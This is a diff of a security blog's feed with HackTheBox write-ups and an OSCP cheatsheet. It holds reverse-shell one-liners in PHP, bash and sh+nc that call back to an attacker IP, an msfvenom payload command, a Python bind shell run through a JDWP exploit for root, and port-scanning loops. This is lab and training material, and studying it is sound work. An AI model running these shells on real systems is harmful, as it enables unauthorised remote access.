     salt <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;$6$&#39;</span><span style="color:#f92672">+</span>salt<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;$&#39;</span>
@@ -969,10 +985,10 @@ session <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;u
     hash <span style="color:#f92672">=</span> crypt<span style="color:#f92672">.</span>crypt(passW, salt)
 
     <span style="color:#66d9ef">if</span> hash <span style="color:#f92672">==</span> realPass:
-        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Authed!&#34;</span>)
+        print(<span style="color:#e6db74">&#34;Authed!&#34;</span>)
         session[<span style="color:#e6db74">&#39;authenticated&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
     <span style="color:#66d9ef">else</span>:
-        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Incorrect pass&#34;</span>)
+        print(<span style="color:#e6db74">&#34;Incorrect pass&#34;</span>)
         os<span style="color:#f92672">.</span>remove(<span style="color:#e6db74">&#39;/tmp/SSH/&#39;</span><span style="color:#f92672">+</span>path)
         sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">0</span>)
     os<span style="color:#f92672">.</span>remove(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(<span style="color:#e6db74">&#39;/tmp/SSH/&#39;</span>,path))
@@ -981,15 +997,15 @@ session <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;u
     sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">0</span>)
 
 <span style="color:#66d9ef">if</span> session[<span style="color:#e6db74">&#39;authenticated&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
-    <span style="color:#66d9ef">while</span> True:
+    <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
         command <span style="color:#f92672">=</span> input(session[<span style="color:#e6db74">&#39;user&#39;</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;@Obscure$ &#34;</span>)
         cmd <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;sudo&#39;</span>, <span style="color:#e6db74">&#39;-u&#39;</span>,  session[<span style="color:#e6db74">&#39;user&#39;</span>]]
         cmd<span style="color:#f92672">.</span>extend(command<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34; &#34;</span>))
         proc <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>Popen(cmd, stdout<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>PIPE, stderr<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>PIPE)
 
         o,e <span style="color:#f92672">=</span> proc<span style="color:#f92672">.</span>communicate()
-        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;Output: &#39;</span> <span style="color:#f92672">+</span> o<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;ascii&#39;</span>))
-        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;Error: &#39;</span>  <span style="color:#f92672">+</span> e<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;ascii&#39;</span>)) <span style="color:#66d9ef">if</span> len(e<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;ascii&#39;</span>)) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;&#39;</span>)
+        print(<span style="color:#e6db74">&#39;Output: &#39;</span> <span style="color:#f92672">+</span> o<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;ascii&#39;</span>))
+        print(<span style="color:#e6db74">&#39;Error: &#39;</span>  <span style="color:#f92672">+</span> e<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;ascii&#39;</span>)) <span style="color:#66d9ef">if</span> len(e<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;ascii&#39;</span>)) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> <span style="color:#66d9ef">else</span> print(<span style="color:#e6db74">&#39;&#39;</span>)
 </code></pre></div><p>On top of this we see that we can run with sudo (tl;dr: as root user) the mentioned script:</p>
 <pre><code class="language-console" data-lang="console">robert@obscure:~/BetterSSH$ sudo -l
 Matching Defaults entries for robert on obscure:
@@ -1140,7 +1156,7 @@ Don&rsquo;t think of &ldquo;Try Harder&rdquo; as you need to exprime more your b
 Take rests, eat, be aware what you are lacking on your documentation and what is excessing, learn to be self-aware of your weakness (mind SQLI and Windows).</p>
 <p><strong>But again most important: Keep trying harder!!</strong></p>
 <p><em>Note: Please let me know any fix needed on the text or whatever, it also helps to keep improving my english :P</em></p>
-]]></content></item><item><title>Hacking/OSCP cheatsheet</title><link>https://ceso.github.io/posts/2020/04/hacking/oscp-cheatsheet/</link><pubDate>Tue, 07 Apr 2020 02:30:30 +0000</pubDate><guid>https://ceso.github.io/posts/2020/04/hacking/oscp-cheatsheet/</guid><description>Hacking/OSCP Cheatsheet Well, just finished my 90 days journey of OSCP labs, so now here is my cheatsheet of it (and of hacking itself), I will be adding stuff in an incremental way as I go having time and/or learning new stuff. But this is basically the tools I tend to relie and use in this way the most. Hope is helpfull for you!
+]]></content></item><item><title>Hacking Cheatsheet</title><link>https://ceso.github.io/posts/2020/04/hacking-cheatsheet/</link><pubDate>Tue, 07 Apr 2020 02:30:30 +0000</pubDate><guid>https://ceso.github.io/posts/2020/04/hacking-cheatsheet/</guid><description>Hacking/OSCP Cheatsheet Well, just finished my 90 days journey of OSCP labs, so now here is my cheatsheet of it (and of hacking itself), I will be adding stuff in an incremental way as I go having time and/or learning new stuff. But this is basically the tools I tend to relie and use in this way the most. Hope is helpfull for you!
 Enumeration Network discoverie Nmap I tend to run 3 nmaps, an initial one, a full one and an UDP one, all of them in parallel:</description><content type="html"><![CDATA[<h1 id="hackingoscp-cheatsheet">Hacking/OSCP Cheatsheet</h1>
 <p>Well, just finished my 90 days journey of OSCP labs, so now here is my cheatsheet of it (and of hacking itself), I will be adding stuff in an incremental way as I go having time and/or learning new stuff.
 But this is basically the tools I tend to relie and use in this way the most.
@@ -1168,12 +1184,12 @@ nmap -sU -p- -oA nmap/udp &lt;ip or cidr&gt;
 </code></pre><h3 id="ports-discovery-without-nmap">Ports discovery (without nmap)</h3>
 <h4 id="nc--bash">nc + bash</h4>
 <p>If you get in a machine that doesn&rsquo;t have nmap installed, you can do a basic discovery of (for example), top 10 ports open in 192.168.30 by doing:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">top10<span style="color:#f92672">=(</span><span style="color:#ae81ff">20</span> <span style="color:#ae81ff">21</span> <span style="color:#ae81ff">22</span> <span style="color:#ae81ff">23</span> <span style="color:#ae81ff">25</span> <span style="color:#ae81ff">80</span> <span style="color:#ae81ff">110</span> <span style="color:#ae81ff">139</span> <span style="color:#ae81ff">443</span> <span style="color:#ae81ff">445</span> 3389<span style="color:#f92672">)</span>; <span style="color:#66d9ef">for</span> i in <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>top10[@]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>; <span style="color:#66d9ef">do</span> nc -w <span style="color:#ae81ff">1</span> 192.168.30.253 $i <span style="color:#f92672">&amp;&amp;</span> echo <span style="color:#e6db74">&#34;Port </span>$i<span style="color:#e6db74"> is open&#34;</span> <span style="color:#f92672">||</span> echo <span style="color:#e6db74">&#34;Port </span>$i<span style="color:#e6db74"> is closed or filtered&#34;</span>; <span style="color:#66d9ef">done</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">top10<span style="color:#f92672">=(</span><span style="color:#ae81ff">20</span> <span style="color:#ae81ff">21</span> <span style="color:#ae81ff">22</span> <span style="color:#ae81ff">23</span> <span style="color:#ae81ff">25</span> <span style="color:#ae81ff">80</span> <span style="color:#ae81ff">110</span> <span style="color:#ae81ff">139</span> <span style="color:#ae81ff">443</span> <span style="color:#ae81ff">445</span> 3389<span style="color:#f92672">)</span>; <span style="color:#66d9ef">for</span> i in <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>top10[@]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>; <span style="color:#66d9ef">do</span> nc -w <span style="color:#ae81ff">1</span> 192.168.30.253 $i <span style="color:#f92672">&amp;&amp;</span> echo <span style="color:#e6db74">&#34;Port </span>$i<span style="color:#e6db74"> is open&#34;</span> <span style="color:#f92672">||</span> echo <span style="color:#e6db74">&#34;Port </span>$i<span style="color:#e6db74"> is closed or filtered&#34;</span>; <span style="color:#66d9ef">done</span>
 </code></pre></div><h4 id="devtcpipport-or-devudpipport">/dev/tcp/ip/port or /dev/udp/ip/port</h4>
 <p>Alternatively, is possible to do the same than above but by using the special dev files <code>/dev/tcp/ip/port</code> or <code>/dev/udp/ip/port</code> (for example nc is not found):</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">top10<span style="color:#f92672">=(</span><span style="color:#ae81ff">20</span> <span style="color:#ae81ff">21</span> <span style="color:#ae81ff">22</span> <span style="color:#ae81ff">23</span> <span style="color:#ae81ff">25</span> <span style="color:#ae81ff">80</span> <span style="color:#ae81ff">110</span> <span style="color:#ae81ff">139</span> <span style="color:#ae81ff">443</span> <span style="color:#ae81ff">445</span> 3389<span style="color:#f92672">)</span>; <span style="color:#66d9ef">for</span> i in <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>top10[@]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>; <span style="color:#66d9ef">do</span> <span style="color:#f92672">(</span>echo &gt; /dev/tcp/192.168.30.253/<span style="color:#e6db74">&#34;</span>$i<span style="color:#e6db74">&#34;</span><span style="color:#f92672">)</span> &gt; /dev/null 2&gt;&amp;<span style="color:#ae81ff">1</span> <span style="color:#f92672">&amp;&amp;</span> echo <span style="color:#e6db74">&#34;Port </span>$i<span style="color:#e6db74"> is open&#34;</span> <span style="color:#f92672">||</span> echo <span style="color:#e6db74">&#34;Port </span>$i<span style="color:#e6db74"> is closed&#34;</span>; <span style="color:#66d9ef">done</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">top10<span style="color:#f92672">=(</span><span style="color:#ae81ff">20</span> <span style="color:#ae81ff">21</span> <span style="color:#ae81ff">22</span> <span style="color:#ae81ff">23</span> <span style="color:#ae81ff">25</span> <span style="color:#ae81ff">80</span> <span style="color:#ae81ff">110</span> <span style="color:#ae81ff">139</span> <span style="color:#ae81ff">443</span> <span style="color:#ae81ff">445</span> 3389<span style="color:#f92672">)</span>; <span style="color:#66d9ef">for</span> i in <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>top10[@]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>; <span style="color:#66d9ef">do</span> <span style="color:#f92672">(</span>echo &gt; /dev/tcp/192.168.30.253/<span style="color:#e6db74">&#34;</span>$i<span style="color:#e6db74">&#34;</span><span style="color:#f92672">)</span> &gt; /dev/null 2&gt;&amp;<span style="color:#ae81ff">1</span> <span style="color:#f92672">&amp;&amp;</span> echo <span style="color:#e6db74">&#34;Port </span>$i<span style="color:#e6db74"> is open&#34;</span> <span style="color:#f92672">||</span> echo <span style="color:#e6db74">&#34;Port </span>$i<span style="color:#e6db74"> is closed&#34;</span>; <span style="color:#66d9ef">done</span>
 </code></pre></div><p>Taking these last  examples, is straightforward to create a dummy script for scan a hole /24 net (for example):</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
 </span><span style="color:#75715e"></span>subnet<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;192.168.30&#34;</span>
 top10<span style="color:#f92672">=(</span><span style="color:#ae81ff">20</span> <span style="color:#ae81ff">21</span> <span style="color:#ae81ff">22</span> <span style="color:#ae81ff">23</span> <span style="color:#ae81ff">25</span> <span style="color:#ae81ff">80</span> <span style="color:#ae81ff">110</span> <span style="color:#ae81ff">139</span> <span style="color:#ae81ff">443</span> <span style="color:#ae81ff">445</span> 3389<span style="color:#f92672">)</span>
 <span style="color:#66d9ef">for</span> host in <span style="color:#f92672">{</span>1..255<span style="color:#f92672">}</span>; <span style="color:#66d9ef">do</span>
@@ -1321,12 +1337,12 @@ Later on is possible to connect from the local machine:
 ssh foo@192.168.25.74
 </code></pre><h2 id="reverse-shells">Reverse shells</h2>
 <h3 id="php">php</h3>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> $sock <span style="color:#f92672">=</span> <span style="color:#a6e22e">fsockopen</span>(<span style="color:#e6db74">&#34;192.168.42.42&#34;</span>,<span style="color:#e6db74">&#34;443&#34;</span>); $proc <span style="color:#f92672">=</span> <span style="color:#a6e22e">proc_open</span>(<span style="color:#e6db74">&#34;/bin/sh -i&#34;</span>, <span style="color:#66d9ef">array</span>(<span style="color:#ae81ff">0</span><span style="color:#f92672">=&gt;</span>$sock, <span style="color:#ae81ff">1</span><span style="color:#f92672">=&gt;</span>$sock, <span style="color:#ae81ff">2</span><span style="color:#f92672">=&gt;</span>$sock), $pipes); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
-</span></code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">php</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">r</span> <span style="color:#e6db74">&#39;$sock=fsockopen(&#34;192.168.42.42&#34;,443);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> $sock <span style="color:#f92672">=</span> <span style="color:#a6e22e">fsockopen</span>(<span style="color:#e6db74">&#34;192.168.42.42&#34;</span>,<span style="color:#e6db74">&#34;443&#34;</span>); $proc <span style="color:#f92672">=</span> <span style="color:#a6e22e">proc_open</span>(<span style="color:#e6db74">&#34;/bin/sh -i&#34;</span>, <span style="color:#66d9ef">array</span>(<span style="color:#ae81ff">0</span><span style="color:#f92672">=&gt;</span>$sock, <span style="color:#ae81ff">1</span><span style="color:#f92672">=&gt;</span>$sock, <span style="color:#ae81ff">2</span><span style="color:#f92672">=&gt;</span>$sock), $pipes); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">php</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">r</span> <span style="color:#e6db74">&#39;$sock=fsockopen(&#34;192.168.42.42&#34;,443);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;</span>
 </code></pre></div><h3 id="bash">bash</h3>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bash -i &gt;&amp; /dev/tcp/192.168.42.42/443 0&gt;&amp;<span style="color:#ae81ff">1</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bash -i &gt;&amp; /dev/tcp/192.168.42.42/443 0&gt;&amp;<span style="color:#ae81ff">1</span>
 </code></pre></div><h3 id="sh--nc">sh + nc</h3>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;<span style="color:#ae81ff">1</span> | nc 192.168.42.42 <span style="color:#ae81ff">443</span> &gt;/tmp/f
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;<span style="color:#ae81ff">1</span> | nc 192.168.42.42 <span style="color:#ae81ff">443</span> &gt;/tmp/f
 </code></pre></div><h3 id="perl-example-deploy-as-cgi-bin">Perl (example deploy as cgi-bin)</h3>
 <pre><code class="language-console" data-lang="console">msfvenom -p cmd/unix/reverse_perl LHOST=&quot;192.168.42.42&quot; LPORT=443 -f raw -o reverse_shell.cgi
 </code></pre><h3 id="java-example-to-deploy-on-tomcat">Java (example to deploy on tomcat)</h3>
@@ -1658,7 +1674,7 @@ tcp                 TIME-WAIT                0                     0            
 <pre><code class="language-console" data-lang="console">root       3875  5.5  5.8 3141684 118248 ?      Sl   21:02   0:05 /usr/bin/java -Djava.util.logging.config.file=/opt/apache-tomcat-9.0.27/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -agentlib:jdwp=transport=dt_socket,address=localhost:8000,server=y,suspend=n -Dignore.endorsed.dirs= -classpath /opt/apache-tomcat-9.0.27/bin/bootstrap.jar:/opt/apache-tomcat-9.0.27/bin/tomcat-juli.jar -Dcatalina.base=/opt/apache-tomcat-9.0.27 -Dcatalina.home=/opt/apache-tomcat-9.0.27 -Djava.io.tmpdir=/opt/apache-tomcat-9.0.27/temp org.apache.catalina.startup.Bootstrap start
 </code></pre><p>A quick search google gives a result the next <a href="https://www.exploit-db.com/exploits/46501">exploit</a></p>
 <p>Then to use that exploit a <code>bind.sh</code> is created under <code>/tmp</code> with the next code:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">python <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#34;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((&#39;&#39;,2222));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;])&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">python <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#34;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((&#39;&#39;,2222));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;])&#34;</span>
 </code></pre></div><p>So, it will bind a shell in the port 2222, after it the exploit is run using that script:</p>
 <pre><code class="language-console" data-lang="console">alexa@AI:~$ ./jdwp-shellifier.py -t 127.0.0.1 -p 8000 --break-on 'java.lang.String.indexOf' --cmd /tmp/bind.sh 
 [+] Targeting '127.0.0.1:8000'
@@ -1738,12 +1754,12 @@ OS and Service detection performed. Please report any incorrect results at https
 
 <p>We notice that <code>Gitlab Login</code> is an obfuscated js code, we jump into deobfuscate it (I used <a href="https://lelinhtinh.github.io/de4js/">de4js</a> but any deobfuscation tool or even a python console will do it):</p>
 <p>From the code:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">javascript</span><span style="color:#f92672">:</span>(<span style="color:#66d9ef">function</span>(){ <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_0x4b18</span><span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;\x76\x61\x6C\x75\x65&#34;</span>,<span style="color:#e6db74">&#34;\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E&#34;</span>,<span style="color:#e6db74">&#34;\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64&#34;</span>,<span style="color:#e6db74">&#34;\x63\x6C\x61\x76\x65&#34;</span>,<span style="color:#e6db74">&#34;\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64&#34;</span>,<span style="color:#e6db74">&#34;\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78&#34;</span>];document[<span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">2</span>]](<span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">1</span>])[<span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">0</span>]]<span style="color:#f92672">=</span> <span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">3</span>];document[<span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">2</span>]](<span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">4</span>])[<span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">0</span>]]<span style="color:#f92672">=</span> <span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">5</span>]; })()
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">javascript</span><span style="color:#f92672">:</span>(<span style="color:#66d9ef">function</span>(){ <span style="color:#66d9ef">var</span> <span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x4b18</span><span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;\x76\x61\x6C\x75\x65&#34;</span>,<span style="color:#e6db74">&#34;\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E&#34;</span>,<span style="color:#e6db74">&#34;\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64&#34;</span>,<span style="color:#e6db74">&#34;\x63\x6C\x61\x76\x65&#34;</span>,<span style="color:#e6db74">&#34;\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64&#34;</span>,<span style="color:#e6db74">&#34;\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78&#34;</span>];document[<span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x4b18</span>[<span style="color:#ae81ff">2</span>]](<span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x4b18</span>[<span style="color:#ae81ff">1</span>])[<span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x4b18</span>[<span style="color:#ae81ff">0</span>]]<span style="color:#f92672">=</span> <span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x4b18</span>[<span style="color:#ae81ff">3</span>];document[<span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x4b18</span>[<span style="color:#ae81ff">2</span>]](<span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x4b18</span>[<span style="color:#ae81ff">4</span>])[<span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x4b18</span>[<span style="color:#ae81ff">0</span>]]<span style="color:#f92672">=</span> <span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x4b18</span>[<span style="color:#ae81ff">5</span>]; })()
 </code></pre></div><p>We get the following code:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">javascript</span><span style="color:#f92672">:</span> (<span style="color:#66d9ef">function</span> () {
-    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_0x4b18</span> <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;value&#34;</span>, <span style="color:#e6db74">&#34;user_login&#34;</span>, <span style="color:#e6db74">&#34;getElementById&#34;</span>, <span style="color:#e6db74">&#34;clave&#34;</span>, <span style="color:#e6db74">&#34;user_password&#34;</span>, <span style="color:#e6db74">&#34;11des0081x&#34;</span>];
-    document[<span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">2</span>]](<span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">1</span>])[<span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">0</span>]] <span style="color:#f92672">=</span> <span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">3</span>];
-    document[<span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">2</span>]](<span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">4</span>])[<span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">0</span>]] <span style="color:#f92672">=</span> <span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">5</span>];
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">javascript</span><span style="color:#f92672">:</span> (<span style="color:#66d9ef">function</span> () {
+    <span style="color:#66d9ef">var</span> <span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x4b18</span> <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;value&#34;</span>, <span style="color:#e6db74">&#34;user_login&#34;</span>, <span style="color:#e6db74">&#34;getElementById&#34;</span>, <span style="color:#e6db74">&#34;clave&#34;</span>, <span style="color:#e6db74">&#34;user_password&#34;</span>, <span style="color:#e6db74">&#34;11des0081x&#34;</span>];
+    document[<span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x4b18</span>[<span style="color:#ae81ff">2</span>]](<span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x4b18</span>[<span style="color:#ae81ff">1</span>])[<span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x4b18</span>[<span style="color:#ae81ff">0</span>]] <span style="color:#f92672">=</span> <span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x4b18</span>[<span style="color:#ae81ff">3</span>];
+    document[<span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x4b18</span>[<span style="color:#ae81ff">2</span>]](<span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x4b18</span>[<span style="color:#ae81ff">4</span>])[<span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x4b18</span>[<span style="color:#ae81ff">0</span>]] <span style="color:#f92672">=</span> <span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x4b18</span>[<span style="color:#ae81ff">5</span>];
 })()
 </code></pre></div><p>With that we get credentials we could try into the login, an user called <code>clave</code> and a password <code>11des0081x</code>, after we try to login with those credentials we are loged and have access to some projects:</p>
 
@@ -1760,7 +1776,7 @@ We continue enumerating a bit more, and see that the project called <code>Deploy
     <img src="/images/htb/bitlab/1.7-web_enum.png"  class="center"  style="border-radius: 8px;"  />
 
 
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
 
 $input <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>(<span style="color:#e6db74">&#34;php://input&#34;</span>);
 $payload  <span style="color:#f92672">=</span> <span style="color:#a6e22e">json_decode</span>($input);
@@ -1886,17 +1902,17 @@ wc -c root.txt
 
 
 <p>We open it and se it&rsquo;s a script to connect to the database and get a dump of profiles:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
 <span style="color:#a6e22e">$db_connection</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_connect</span>(<span style="color:#e6db74">&#34;host=localhost dbname=profiles user=profiles password=profiles&#34;</span>);
 <span style="color:#a6e22e">$result</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_query</span>(<span style="color:#a6e22e">$db_connection</span>, <span style="color:#e6db74">&#34;SELECT * FROM profiles&#34;</span>);
 </code></pre></div><p>Then, inside the profile project we add a new file with that code, but also we create an array with <code>pg_fetch_all($result)</code> in order to save all the profiles dumped, so the result is this one:</p>
